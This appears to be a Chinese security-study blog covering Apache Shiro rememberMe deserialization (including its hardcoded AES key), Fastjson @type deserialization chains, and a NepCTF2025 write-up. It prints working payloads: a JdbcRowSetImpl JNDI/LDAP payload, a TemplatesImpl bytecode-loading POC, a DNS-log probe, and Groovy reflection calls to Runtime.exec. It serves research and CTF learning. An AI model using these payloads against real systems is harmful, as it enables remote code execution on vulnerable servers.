**内置过滤器（Filter）**，该过滤器主要是执行登录请求处理，判断是否登录授权访问等功能\n\n接下来我们看一下在登录页面发起post表单请求后的处理逻辑\n\n1、当我们在登录界面发起请求的时候，shiro会启动自身的安全过滤器链，也就是调用AbstractShiroFilter#doFilterInternal()方法\n\n我们直接来到AbstractShiroFilter类，断点打在doFilterInternal方法，登录的时候会进入这个方法。\n\n![image-20250801103831754](../image/achieve/202411/java学习/image-20250801103831754.png)\n\n2、然后该方法会给我们找到匹配的过滤器，也就是之前说的authc，对应的类就是`org.apache.shiro.web.filter.authc.FormAuthenticationFilter`类，他是authc的处理逻辑的核心入口。\n\n3、调用FormAuthenticationFilter#onAccessDenied()方法\n\n![image-20250801104914788](../image/achieve/202411/java学习/image-20250801104914788.png)\n\n分析一下代码\n\n```java\n    protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception {\n        if (isLoginRequest(request, response)) {//判断当前请求是否是shiro.loginUrl\n            if (isLoginSubmission(request, response)) {//判断当前请求是否是POST 请求并且包含表单字段，也就是登录操作\n                if (log.isTraceEnabled()) {\n                    log.trace(\"Login submission detected.  Attempting to execute login.\");\n                }\n                return executeLogin(request, response);//执行登录认证逻辑函数\n            } else {\n                if (log.isTraceEnabled()) {\n                    log.trace(\"Login page view.\");\n                }\n                //allow them to see the login page ;)\n                return true;//如果不是POST请求就放行，显示登录页面\n            }\n        } else {\n            if (log.isTraceEnabled()) {\n                log.trace(\"Attempting to access a path which requires authentication.  Forwarding to the \" +\n                        \"Authentication url [\" + getLoginUrl() + \"]\");\n            }\n\n            saveRequestAndRedirectToLogin(request, response);//如果是访问的其他受保护的资源，就返回false\n            return false;\n        }\n    }\n```\n\n因为我们是提交表单的POST请求，所以会调用executeLogin函数，我们跟进看看\n\n![image-20250801105509471](../image/achieve/202411/java学习/image-20250801105509471.png)\n\n这里主要是从请求中创建一个令牌token，生成一个 `AuthenticationToken` 对象，登录成功后触发onLoginSuccess方法返回true。\n\n4、真正的登录认证函数：org.apache.shiro.subject.support.DelegatingSubject#login()\n\n![image-20250801110002322](../image/achieve/202411/java学习/image-20250801110002322.png)\n\n5、然后一直来到DefaultSecurityManager类找到rememberMeSuccessfulLogin函数，这是用于处理`Remember Me`功能的部分\n\n![image-20250801114136900](../image/achieve/202411/java学习/image-20250801114136900.png)\n\n先调用AbstractRememberMeManager类的onSuccessfulLogin方法，这个方法是处理登录成功逻辑的\n\n![image-20250801114741943](../image/achieve/202411/java学习/image-20250801114741943.png)\n\n重点在于第一行代码\n\n```java\n forgetIdentity(subject);\n```\n\n这个功能的话在于清除旧的`\"记住我\"`的身份，我们跟进这来到CookieRememberMeManager的forgetIdentity方法\n\n![image-20250801153707910](../image/achieve/202411/java学习/image-20250801153707910.png)\n\n然后继续跟进里面的forgetIdentity方法\n\n![image-20250801153746178](../image/achieve/202411/java学习/image-20250801153746178.png)\n\n这里的话会获取cookie字段然后删除该字段，我们跟进一下\n\n![image-20250801154009302](../image/achieve/202411/java学习/image-20250801154009302.png)\n\n分析一下代码\n\n```java\n    public void removeFrom(HttpServletRequest request, HttpServletResponse response) {\n        String name = getName();//获取Cookie的名称，这里是rememberMe\n        String value = DELETED_COOKIE_VALUE;//设置一个值未deleteMe\n        String comment = null; //don't need to add extra size to the response - comments are irrelevant for deletions\n        String domain = getDomain();\n        String path = calculatePath(request);\n        int maxAge = 0; //always zero for deletion\n        int version = getVersion();\n        boolean secure = isSecure();\n        boolean httpOnly = false; //no need to add the extra text, plus the value 'deleteMe' is not sensitive at all\n\n        addCookieHeader(response, name, value, comment, domain, path, maxAge, version, secure, httpOnly);\n//调用方法设置set-Cookie头，并将上面的rememberMe=deleteMe加入到响应头\n        log.trace(\"Removed '{}' cookie by setting maxAge=0\", name);\n    }\n```\n\n这里的话就是返回一个Set-Cookie响应头，将rememberMe设置为deleteMe，我们继续往下走，回到onSuccessfulLogin方法\n\n![image-20250801155428962](../image/achieve/202411/java学习/image-20250801155428962.png)\n\n检查登录的时候是否选择了“记住我”选项，之前我们传的时候就选上了，所以直接步入rememberIdentity函数\n\n![image-20250801155642682](../image/achieve/202411/java学习/image-20250801155642682.png)\n\n![image-20250801155649820](../image/achieve/202411/java学习/image-20250801155649820.png)\n\n```java\n    protected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) {\n        byte[] bytes = convertPrincipalsToBytes(accountPrincipals);\n        rememberSerializedIdentity(subject, bytes);\n    }\n```\n\n这里的话会将身份信息转化成字节数组，并传入rememberSerializedIdentity方法中。\n\n![image-20250801160104550](../image/achieve/202411/java学习/image-20250801160104550.png)\n\n可以看到这里传入的值是root\n\n跟进convertPrincipalsToBytes方法看看\n\n![image-20250801160014768](../image/achieve/202411/java学习/image-20250801160014768.png)\n\n进行了一个序列化操作，判断不为空之后进入一个encrypt方法，我们继续步入\n\n![image-20250801160228451](../image/achieve/202411/java学习/image-20250801160228451.png)\n\n使用 `cipherService.encrypt()` 对序列化数据进行加密，密钥由 `getEncryptionCipherKey()`提供，最后将加密后的数据转成byte数组返回。这里的加密方式为AES/CBC/PKCS5Padding\n\n在`encrypt()`中，可以看到使用的加密算法是AES，使用AES算法对cookie进行加密。\n\n接着进入getEncryptionCipherKey方法\n\n![image-20250801160638941](../image/achieve/202411/java学习/image-20250801160638941.png)\n\n这是一个getter方法，用来获取当前对象中的 AES 加密密钥字段，我们看看这个字段的setter方法\n\n![image-20250801163627218](../image/achieve/202411/java学习/image-20250801163627218.png)\n\n然后我们看看哪里调用了这个函数\n\n![image-20250801163657976](../image/achieve/202411/java学习/image-20250801163657976.png)\n\n在`setCipherKey()`中同时给加解密密钥赋值，我们跟进看一下CipherKey\n\n![image-20250801160735802](../image/achieve/202411/java学习/image-20250801160735802.png)\n\n可以看见密钥\\DEFAULT_CIPHER_KEY_BYTES\\是一个常量，就是然后看看哪里调用了这个setCipherKey()方法\n\n![image-20250801160828360](../image/achieve/202411/java学习/image-20250801160828360.png)\n\n所以这里最终获取到的加密密钥：`kPH+bIxk5D2deZiIxcaaaA==`，返回后进入cipherService.encrypt函数\n\n![image-20250801162219622](../image/achieve/202411/java学习/image-20250801162219622.png)\n\n生成初始化向量ivBytes后，进入具体的加密函数，重点在最后的return中\n\n```java\nreturn encrypt(plaintext, key, ivBytes, generate);\n```\n\n在加密完成后返回到之前的rememberIdentity函数，下面的rememberSerializedIdentity实现了记住序列化身份的功能\n\n![image-20250801162541902](../image/achieve/202411/java学习/image-20250801162541902.png)\n\n![image-20250801162629699](../image/achieve/202411/java学习/image-20250801162629699.png)\n\n这里的话会对序列化的数据进行base64加密，并将信息加入Cookie字段中，然后我们一直返回，回到一开始的executeLogin方法\n\n![image-20250801162759765](../image/achieve/202411/java学习/image-20250801162759765.png)\n\n![image-20250801162851975](../image/achieve/202411/java学习/image-20250801162851975.png)\n\n![image-20250801162915951](../image/achieve/202411/java学习/image-20250801162915951.png)\n\n以上就是大致的登录逻辑分析了\n\n这时候不难发现，这里的话加密密钥是一个常量，所以这里也是漏洞利用点\n\n### 解密流程\n\n我们尝试一下带着刚刚生成的rememberMe字段的值去访问一下限制访问页面account，看看后端对cookie解密的处理逻辑是什么样的\n\n在AbstractShiroFilter类的doFilterInternal方法下断点，单步进入DefaultSecurityManager类的createSubject方法\n\n![image-20250801170858043](../image/achieve/202411/java学习/image-20250801170858043.png)\n\n继续跟进resolvePrincipals方法，单步到getRememberedIdentity，RememberMeManager获取后进入getRememberedPrincipals方法\n\n![image-20250803215909797](../image/achieve/202411/java学习/image-20250803215909797.png)\n\n![image-20250803220007805](../image/achieve/202411/java学习/image-20250803220007805.png)\n\n然后看这里的第一个函数getRememberedSerializedIdentity，可以看到先获取cookie中的值，然后base64解密，生成二进制数后返回\n\n![image-20250803220103463](../image/achieve/202411/java学习/image-20250803220103463.png)\n\n然后看第二个函数convertBytesToPrincipals，先获取解密服务，解密服务不为空后，将二进制数据传入decrypt函数进行解密，之后return deserialize(bytes)\n\n![image-20250803220205893](../image/achieve/202411/java学习/image-20250803220205893.png)\n\n在deserialize方法中，跟进后发现有一个readObject()方法，可以触发apache.commons利用链漏洞\n\n![image-20250803220301578](../image/achieve/202411/java学习/image-20250803220301578.png)\n\n所以整个过程就是：读取cookie中rememberMe值->base64解码->AES解密->反序列化\n\n那么这里的话获取密钥就成了关键，只要获取到密钥，就可以进行反序列化操作。密钥的话我们之前分析过，是一个固定的常量，所以就可以很轻松的利用到整个漏洞了。\n\n在1.2.5之后，shiro采取了随机密钥，虽然阻止了shiro550的利用方式。但由于padding oracle attack也导致了反序列化。也就是我们的shiro721\n\n## shiro721\n\n### 影响版本\n\nApache Shiro <= 1.4.1\n\n### 特征判断\n\n响应包中包含字段remember=deleteMe字段\n\n### 漏洞原理\n\n在Shiro721漏洞中，由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle Attack来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。\n\n虽然使用Padding Oracle Attack可以绕过密钥直接构造攻击密文，但是在进行攻击之前我们需要获取一个合法用户的Cookie。\n\n### 关于Oracle填充攻击\n\n**Padding Oracle Attack（填充预言攻击）\\**是一种针对对称加密模式（尤其是 \\*\\*CBC 模式\\*\\*）的攻击方式，攻击者通过观察服务器对错误填充的响应，可以\\**逐字节恢复密文对应的明文**，甚至伪造合法的加密数据。\n","tags":["java反序列化"],"categories":["javasec"]},{"title":"Fastjson反序列化","url":"/2025/07/29/Java反序列化之Fastjson反序列化/","content":"\n## 0x01前言\n\n最近工作比较忙，给自己休整了几天，正好过两天就周末了要出门也没空学啥，所以打算把学习任务提前一下。原谅自己学习进度太慢了。。。\n\n参考文章依旧是infer师傅的文章：https://infernity.top/2025/02/25/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/\n\n还有一个师傅的文章写的也很好：[Java安全学习——Fastjson反序列化漏洞](https://goodapple.top/archives/832)\n\n## 0x02Fastjson的序列化和反序列化\n\nfastjson 是阿里巴巴开发的 java语言编写的高性能 JSON 库，用于将数据在 Json 和 Java Object之间相互转换。它没有用java的序列化机制，而是自定义了一套序列化机制。\n\n在fastjson中提供了两种接口函数\n\n- `JSON#toJSONString()`实现对象的序列化操作\n- `JSON#parseObject()/JSON#parse()`实现对象的反序列化操作\n\n但是对于Fastjson来说，并不是所有的java对象都能被序列化为JSON，只有JavaBean格式的对象才能被Fastjson转化成JSON格式\n\n我们写个demo来看看序列化和反序列化流程的走向\n\n```java\nclass Person {\n    //使用Alt+Insert键可以快速生成属性的getter和setter方法\n    public String name;\n    public int age;\n\n    public String getName() {\n        System.out.println(\"执行了getName方法\");\n        return name;\n    }\n\n    public void setName(String name) {\n        System.out.println(\"执行了setName方法\");\n        this.name = name;\n    }\n\n    public int getAge() {\n        System.out.println(\"执行了getAge方法\");\n        return age;\n    }\n\n    public void setAge(int age) {\n        System.out.println(\"执行了setAge方法\");\n        this.age = age;\n    }\n}\n```\n\n然后我们写个序列化和反序列化的操作\n\n先看看序列化的操作\n\n```java\npublic class Demo {\n    public static void main(String[] args) {\n        Person p = new Person();\n        p.setName(\"John\");\n        p.setAge(22);\n\n        //序列化\n        System.out.println(\"----------序列化操作----------\");\n        String json = JSON.toJSONString(p);\n        System.out.println(json);\n    }\n}\n```\n\n输出\n\n```java\n执行了setName方法\n执行了setAge方法\n----------序列化操作----------\n执行了getAge方法\n执行了getName方法\n{\"age\":22,\"name\":\"John\"}\n```\n\n在toJSONString()方法处打个断点调试一下\n\n首先进入了第一个toJSOINString方法\n\n```java\n    public static String toJSONString(Object object) {\n        return toJSONString(object, emptyFilters);\n    }\n```\n\n随后进入里面的另一个toJSONString()方法\n\n```java\n    public static String toJSONString(Object object, SerializeFilter[] filters, SerializerFeature... features) {\n        return toJSONString(object, SerializeConfig.globalInstance, filters, (String)null, DEFAULT_GENERATE_FEATURE, features);\n    }\n```\n\n然后又是一个toJSONString()方法\n\n```java\n    public static String toJSONString(Object object, // \n                                      SerializeConfig config, // \n                                      SerializeFilter[] filters, // \n                                      String dateFormat, //\n                                      int defaultFeatures, // \n                                      SerializerFeature... features) {\n        SerializeWriter out = new SerializeWriter(null, defaultFeatures, features);\n\n        try {\n            JSONSerializer serializer = new JSONSerializer(out, config);\n            \n            if (dateFormat != null && dateFormat.length() != 0) {\n                serializer.setDateFormat(dateFormat);\n                serializer.config(SerializerFeature.WriteDateUseDateFormat, true);\n            }\n\n            if (filters != null) {\n                for (SerializeFilter filter : filters) {\n                    serializer.addFilter(filter);\n                }\n            }\n\n            serializer.write(object);\n\n            return out.toString();\n        } finally {\n            out.close();\n        }\n    }\n```\n\n里面的就是具体的序列化流程了，这个就不深究了\n\n我们再来看看反序列化流程\n\n先看看JSON#parseObject()方法的参数\n\n```java\n    public static <T> T parseObject(String text, Class<T> clazz) {\n        return parseObject(text, clazz, new Feature[0]);\n    }\n```\n\n接收JSON字符串和原生类作为参数，将JSON字符串转换为对应的Java对象。\n\n反序列化看看\n\n```java\npublic class Demo {\n    public static void main(String[] args) {\n        Person p = new Person();\n        p.setName(\"John\");\n        p.setAge(22);\n\n        //序列化\n        System.out.println(\"----------序列化操作----------\");\n        String json = JSON.toJSONString(p);\n        System.out.println(json);\n\n        //反序列化\n        System.out.println(\"----------反序列化操作----------\");\n        Person unserjson = JSON.parseObject(json, Person.class);\n        System.out.println(unserjson);\n    }\n}\n```\n\n![image-20250717152311981](../image/achieve/202411/java学习/image-20250717152311981.png)\n\n其实到这里的话就很清楚了，在反序列化的时候，JSON#parseObject()方法会再一次调用原生类的Setter方法。\n\n**如果我们反序列化时不指定特定的类，那么Fastjosn就默认将一个JSON字符串反序列化为一个JSONObject。需要注意的是，对于类中`private`类型的属性值，Fastjson默认不会将其序列化和反序列化。**\n\n不过在上面的例子中可以看出，JSON#parseObject方法调用的时候我们是给它固定了原生类为Person.class，那么如果在实际环境中，有那么多的类的话，此时程序如何知道自己需要反序列化什么类的对象呢？这时候就需要用到一个注解@type了\n\n将JSON反序列化为原始的类的方法有两种\n\n- 第一种是在序列化的时候，在toJSONString方法中添加额外的属性`SerializerFeature.WriteClassName`，将对象类型一并序列化，我们测试一下\n\n![image-20250717153201784](../image/achieve/202411/java学习/image-20250717153201784.png)\n\n结果就是Fastjson在JSON字符串中添加了一个@type字段，这个用于标识对象所属的类\n\n在反序列化的时候，parse()方法就会根据@type字段去转化成原来的类\n\n![image-20250717153456691](../image/achieve/202411/java学习/image-20250717153456691.png)\n\n- 第二种方法是在反序列化的时候，在`parseObject()`方法中手动指定对象的类型\n\n## 0x02Fastjson中的@type\n\n我们介绍一下这里的@type字段\n\n@type是fastjson中的一个特殊注解，用于标识JSON字符串中的某个属性是哪个Java对象的类型。具体来说，**当fastjson从JSON字符串反序列化为Java对象时，如果JSON字符串中包含@type属性，fastjson会根据该属性的值来确定反序列化后的Java对象的类型。**\n\n再来看看下面两个测试代码\n\n```java\npublic class Demo {\n    public static void main(String[] args) {\n\n        //反序列化\n        System.out.println(\"----------反序列化操作1----------\");\n        String  ser_json1 = \"{\\\"name\\\":\\\"wanth3f1ag\\\",\\\"age\\\":22}\";\n        JSON.parseObject(ser_json1);\n\n        System.out.println(\"----------反序列化操作2----------\");\n        String  ser_json2 = \"{\\\"@type\\\":\\\"SerializeChains.FastjsonSer.Person\\\",\\\"name\\\":\\\"wanth3f1ag\\\",\\\"age\\\":22}\";\n        JSON.parseObject(ser_json2);\n    }\n}\n```\n\n![image-20250717154235481](../image/achieve/202411/java学习/image-20250717154235481.png)\n\n可以看到在没有指定@type字段的时候，程序并不知道该把JSON字符串序列化成哪个类型的对象，当我们用@type属性后，就能正常的将JSON字符串按照Person类去反序列化回java对象\n\n这样就会调用对应的setter和getter方法。\n\n那么这里就引出一个问题，如果这里的@type没有进行特殊的处理和检查，我们是否可以利用这个属性去指定一些恶意类去实例化利用他们呢？\n\n例如DNS请求的类\n\n```java\n{\"@type\":\"java.net.InetAddress\",\"val\":\"b3jv10.dnslog.cn\"}\n```\n\n![image-20250717160002116](../image/achieve/202411/java学习/image-20250717160002116.png)\n\n成功接收到DNS请求\n\n那么同样的，我们的类中的getter或setter方法包含恶意代码的话也就能执行\n\n![image-20250717160902828](../image/achieve/202411/java学习/image-20250717160902828.png)\n\n因此，只要我们能找到一个合适的Java Bean，其setter或getter存在可控参数，则有可能造成任意命令执行。\n\n## 0x03Fastjson <= 1.2.24-Chains\n\n我们来看最开始出现序列化的版本Fastjson<=1.2.24，在这个版本中是默认支持@type这个属性的\n\n这个版本有两条利用链JdbcRowSetImpl利用链和Templateslmpl利用链\n\n## JdbcRowSetImpl利用链\n\nJdbcRowSetImpl利用链最终的结果是导致JNDI注入，需要结合JDBC的攻击手法去利用，这个是通用性最强的利用方式\n\n`JdbcRowSetImpl`利用链的重点就在怎么调用`autoCommit`的set方法，而fastjson反序列化的特点就是会自动调用到类的set方法，所以会存在这个反序列化的问题。\n\n我们看一下JdbcRowSetImpl类中的setAutoCommit方法\n\n![image-20250729143829876](../image/achieve/202411/java学习/image-20250729143829876.png)\n\n如果conn为null的话就会进入else语句，并调用到connect()方法，我们跟进看一下\n\n```java\n    private Connection connect() throws SQLException {\n        if (this.conn != null) {\n            return this.conn;\n        } else if (this.getDataSourceName() != null) {\n            try {\n                InitialContext var1 = new InitialContext();\n                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());\n                return this.getUsername() != null && !this.getUsername().equals(\"\") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();\n            } catch (NamingException var3) {\n                throw new SQLException(this.resBundle.handleGetObject(\"jdbcrowsetimpl.connect\").toString());\n            }\n        } else {\n            return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;\n        }\n    }\n```\n\n这里的话如果配置了数据源名称（DataSourceName）时会优先通过JNDI获取连接，之后并根据是否配置了用户名和密码选择对应的连接方法。如果没有配置数据源名称的话会**通过 JDBC URL 直接获取连接**。\n\n跟进看一下lookup方法，发现lookup方法是JNDI中访问远程服务器获取远程对象的方法，其参数为服务器地址。\n\n![image-20250729144704279](../image/achieve/202411/java学习/image-20250729144704279.png)\n\n然后我们看一下DataSourceName的set和get方法\n\n```java\n    public String getDataSourceName() {\n        return dataSource;\n    }\n    public void setDataSourceName(String name) throws SQLException {\n\n        if (name == null) {\n            dataSource = null;\n        } else if (name.equals(\"\")) {\n           throw new SQLException(\"DataSource name cannot be empty string\");\n        } else {\n           dataSource = name;\n        }\n\n        URL = null;\n    }\n```\n\n`setDataSourceName`()方法会设置`dataSource`的值\n\n所以我们这里将dataSource赋值为我们恶意文件的远程地址。\n\n因此我们可以构造利用链，设置@type的类型为jdbcRowSetlmpl类型，然后我们将dataSourceName传给lookup方法，最后再设置一下autoCommit属性，让lookup触发就行了\n\n### payload1（LDAP+JDBC）\n\n```java\nimport com.alibaba.fastjson.JSON;\n \npublic class Fastjson_Jdbc_LDAP {\n    public static void main(String[] args) {\n        String payload = \"{\" +\n                \"\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\" +\n                \"\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:9999/EXP\\\", \" +\n                \"\\\"autoCommit\\\":true\" +\n                \"}\";\n        JSON.parse(payload);\n    }\n}\n```\n\n需要注意的是，这里的dataSourceName需要放在autoCommit前面，因为反序列化的顺序问题，我们需要先让setDataSourceName执行，然后再执行setautoCommit。\n\n## TemplatesImpl利用链\n\n**影响1.2.22-1.2.24**\n\n这个之前讲过很多次了只不过这里的话是利用json反序列化去打的而已\n\n```java\n{\n  \"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n  \"_bytecodes\":[恶意类的base64],\n  '_name':'test',\n  '_tfactory':{},\n  '_outputProperties':{}\n}\n```\n\n### payload2\n\n```java\npackage SerializeChains.FastjsonSer;\n\nimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.parser.Feature;\nimport com.alibaba.fastjson.parser.ParserConfig;\n\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.Base64;\n\npublic class POC2 {\n    public static void main(String[] args) throws IOException {\n        byte[] bytes = Files.readAllBytes(Paths.get(\"E:\\\\java\\\\JavaSec\\\\JavaSerialize\\\\target\\\\classes\\\\SerializeChains\\\\CCchains\\\\CC3\\\\POC.class\"));\n        String base64_code = Base64.getEncoder().encodeToString(bytes);\n        //System.out.println(base64_code);\n\n        String Payload = \"{\\\"@type\\\":\\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\",\" +\n                \"\\\"_bytecodes\\\":[\\\"\"+base64_code+\"\\\"],\" +\n                \"\\\"_name\\\":\\\"test\\\",\" +\n                \"\\\"_tfactory\\\":{},\" +\n                \"\\\"_outputProperties\\\":{}\" +\n                \"}\\n\";\n\n        JSON.parseObject(Payload, Object.class, new ParserConfig(), Feature.SupportNonPublicField);\n    }\n}\n\n```\n\n由于payload需要赋值的一些属性为`private`类型，需要在`parse()`反序列化时设置第二个参数`Feature.SupportNonPublicField`，服务端才能从JSON中恢复`private`类型的属性。\n\n这里的话有三个问题\n\n#### 问题1：base64编码\n\n根据之前的学习，我们知道其实_bytecodes需要传入的是一个字节码，但是为什么这里需要用base64编码呢？\n\n因为在反序列化的时候，会对字符串的类型进行一个判断，如果是一个base64编码的话会被解码成byte数组\n\n我们可以调试一下\n\n![image-20250729151800987](../image/achieve/202411/java学习/image-20250729151800987.png)\n\n然后进入bytesValue()方法\n\n![image-20250729151848938](../image/achieve/202411/java学习/image-20250729151848938.png)\n\n这里的话会对传入的base64进行一个解码操作\n\n#### 问题2：_tfactory为什么为空\n\n在之前CC3中可以知道，`_tfactory`需要设置为一个TransformerFactoryImpl对象才能让链子走下去，但是这里为什么为空也能正常执行呢？\n\n因为为空会新建实例进行赋值\n\n至于_tfactory为什么会知道是TransformerFactoryImpl呢？这是在类中已经定义好了。\n\n```java\nprivate transient TransformerFactoryImpl _tfactory = null;\n```\n\n#### 问题3：如何调用getOutputProperties方法\n\n对于TemplatesImpl链，我们的最终目标是调用defineClass()进行动态类加载。而该类中的`getOutputProperties()`方法能够最终走到defineClass()，并且格式也符合getter。所以构造一个`TemplatesImpl`类的JSON，并且将`_outputProperties`赋值，这样Fastjson在反序列化时就会调用`getOutputProperties()`方法了。\n","tags":["java反序列化"],"categories":["javasec"]},{"title":"NepCTF2025","url":"/2025/07/25/NepCTF2025/","content":"\n## Web\n\n## easyGooGooVVVY\n\n考的是沙盒环境的Groovy 表达式注入，发现正常的执行命令的类被过滤掉了，后面想起来可以用反射去打\n\n搜到一篇文章：https://www.cnblogs.com/TWX521/p/17916224.html\n\n```java\njava.lang.String.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\").getText()\n```\n\n任意一个内置类的原型类都会有forName这个静态方法，那就很好做了\n\n![image-20250725193910495](../image/achieve/202411/NepCTF2025/image-20250725193910495.png)\n\n能回显，然后也没过滤什么命令，直接打就行，flag在env环境变量中\n\n```java\njava.lang.String.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"env\").getText()\n```\n\n## safe_bank(复现)\n\n放在另一篇专门单开的文章里了\n\n## RevengeGooGooVVVY\n\n有两份源码\n\n```java\n//phase3purifiler.java\n\npackage org.example.expressinject.Test.Groovy;\n\nimport groovy.lang.Grab;\nimport groovy.transform.ASTTest;\nimport org.codehaus.groovy.ast.*;\nimport org.codehaus.groovy.classgen.GeneratorContext;\nimport org.codehaus.groovy.control.CompilationFailedException;\nimport org.codehaus.groovy.control.CompilationUnit;\nimport org.codehaus.groovy.control.CompilePhase;\nimport org.codehaus.groovy.control.SourceUnit;\nimport org.codehaus.groovy.control.customizers.CompilationCustomizer;\n\nimport java.lang.annotation.Annotation;\nimport java.util.Arrays;\nimport java.util.Collections;\nimport java.util.List;\n\npublic class Phase3Purifiler extends CompilationCustomizer {\n    private static final List<String> BLOCKED_TRANSFORMS = Collections.unmodifiableList(Arrays.asList(\n            \"ASTTest\",\n            \"Grab\",\n            \"GrabConfig\",\n            \"GrabExclude\",\n            \"GrabResolver\",\n            \"Grapes\",\n            \"AnnotationCollector\"\n    ));\n\n    public Phase3Purifiler() {\n        super(CompilePhase.CONVERSION);\n    }\n\n    @Override\n    public void call(SourceUnit source, GeneratorContext context, ClassNode classNode) throws CompilationFailedException {\n        new RejectASTTransformsVisitor(source).visitClass(classNode);\n    }\n\n    @Override\n    public void doPhaseOperation(CompilationUnit unit) throws CompilationFailedException {\n        super.doPhaseOperation(unit);\n    }\n\n    @Override\n    public boolean needSortedInput() {\n        return super.needSortedInput();\n    }\n\n\n    private static class RejectASTTransformsVisitor extends ClassCodeVisitorSupport {\n        private SourceUnit source;\n\n        public RejectASTTransformsVisitor(SourceUnit source) {\n            this.source = source;\n        }\n\n        @Override\n        protected SourceUnit getSourceUnit() {\n            return source;\n        }\n\n        @Override\n        public void visitAnnotations(AnnotatedNode node) {\n            for (AnnotationNode an : node.getAnnotations()) {\n                for (String blockedAnnotation : BLOCKED_TRANSFORMS) {\n                    if (an.getClassNode().getName().contains(blockedAnnotation)) {\n                        throw new SecurityException(\"Annotation \" + blockedAnnotation + \" cannot be used in the sandbox.\");\n                    }\n                }\n            }\n        }\n\n        @Override\n        public void visitImports(ModuleNode node) {\n            if (node != null) {\n                for (ImportNode importNode : node.getImports()) {\n                    checkImportForBlockedAnnotation(importNode);\n                }\n                for (ImportNode importStaticNode : node.getStaticImports().values()) {\n                    checkImportForBlockedAnnotation(importStaticNode);\n                }\n            }\n        }\n\n    }\n\n    private static void checkImportForBlockedAnnotation(ImportNode node) {\n        if (node != null && node.getType() != null) {\n            for (String blockedAnnotation : BLOCKED_TRANSFORMS) {\n                if (node.getType().getName().contains(blockedAnnotation)) {\n                    throw new SecurityException(\"Annotation \" + node.getType().getName() + \" cannot be used in the sandbox.\");\n                }\n            }\n        }\n    }\n}\n\n\n```\n\n这是一个Groovy编译定制器，用于在编译阶段检查和阻止特定的AST转换注解。就是Groovy 源码刚刚被解析成抽象语法树（AST）之后执行的，我们看看这里的注解黑名单\n\n```java\n    private static final List<String> BLOCKED_TRANSFORMS = Collections.unmodifiableList(Arrays.asList(\n            \"ASTTest\",\n            \"Grab\",\n            \"GrabConfig\",\n            \"GrabExclude\",\n            \"GrabResolver\",\n            \"Grapes\",\n            \"AnnotationCollector\"\n    ));\n```\n\n- @Grab, @Grapes 等: 这是 **Groovy Grapes** 依赖管理系统的注解。他们在运行时能**从互联网上动态下载并加载任意的 JAR 包**\n- @ASTTest: 用于在编译时对 AST 进行测试和断言，可以被滥用来执行任意代码或修改 AST，。\n- @AnnotationCollector: 可以将多个注解“打包”成一个自定义注解，可能被用来隐藏其他被禁止的注解，从而绕过检查。\n\n所以这个代码主要是对一些危险的注解进行一个禁用，防止在AST语法树阶段解析注解的时候会执行自定义注解处理器从而导致一些危险的注解实现代码执行。\n\n我们主要看第二个\n\n```java\n//customgroovypurifier.java\n\npackage org.example.expressinject.Test.Groovy;\n\nimport org.codehaus.groovy.ast.ClassNode;\nimport org.codehaus.groovy.ast.expr.Expression;\nimport org.codehaus.groovy.ast.expr.MethodCallExpression;\nimport org.codehaus.groovy.control.customizers.SecureASTCustomizer;\n\nimport java.lang.reflect.Method;\nimport java.util.*;\n\npublic class CustomGroovyPurifier extends SecureASTCustomizer {\n    private static final Set<String> STRING_METHODS = new HashSet<>();\n    private SecureASTCustomizer secureASTCustomizer = new SecureASTCustomizer();\n\n    public SecureASTCustomizer CreateASTCustomizer() {\n\n        secureASTCustomizer.addExpressionCheckers(expr -> {\n            if (expr instanceof MethodCallExpression) {\n                MethodCallExpression methodCall = (MethodCallExpression) expr;\n                Expression objectExpr = methodCall.getObjectExpression();\n                ClassNode type = objectExpr.getType();\n                type.getClass();\n                String typeName = type.getName();\n                String methodName = methodCall.getMethodAsString();\n                if (typeName.equals(\"java.lang.String\")) {\n                    if (STRING_METHODS.contains(methodName)) {\n                        return true;\n                    } else {\n                        throw new SecurityException(\"Calling \"+methodName+\"  on \"+ \"String is not allowed\");\n                    }\n                }\n\n                if (methodName.equals(\"execute\")) {\n                        throw new SecurityException(\"Calling \"+methodName+\" on \"+ \"is not allowed\");\n                }\n            }\n            return true;\n        });\n        secureASTCustomizer.setClosuresAllowed(false);\n        return secureASTCustomizer;\n    }\n    static {\n        for (Method method : String.class.getDeclaredMethods()) {\n            STRING_METHODS.add(method.getName());\n        }\n    }\n\n}\n\n```\n\n这里的话在我们逐步分析\n\n可以看到，`secureASTCustomizer.addExpressionCheckers(expr ->`这里的话会将我们沙箱中每个表达式都在此进行处理，那我们重点看里面的处理逻辑\n\n```java\nif (expr instanceof MethodCallExpression) {\n                MethodCallExpression methodCall = (MethodCallExpression) expr;\n                Expression objectExpr = methodCall.getObjectExpression();\n                ClassNode type = objectExpr.getType();\n                type.getClass();\n                String typeName = type.getName();\n                String methodName = methodCall.getMethodAsString();\n                if (typeName.equals(\"java.lang.String\")) {\n                    if (STRING_METHODS.contains(methodName)) {\n                        return true;\n                    } else {\n                        throw new SecurityException(\"Calling \"+methodName+\"  on \"+ \"String is not allowed\");\n                    }\n                }\n\n                if (methodName.equals(\"execute\")) {\n                        throw new SecurityException(\"Calling \"+methodName+\" on \"+ \"is not allowed\");\n                }\n            }\n            return true;\n        \n```\n\n外层if语句只检查了函数调用表达式`something.method()`类似的调用，其他类型的表达式都不管\n\n进入if语句后，会获取调用方法的对象类型，调用方法的名字\n\n- 如果我们调用的是String对象的方法，那么就会触发白名单验证，但是这里没有给出来，如果没在白名单里就会抛出异常\n- 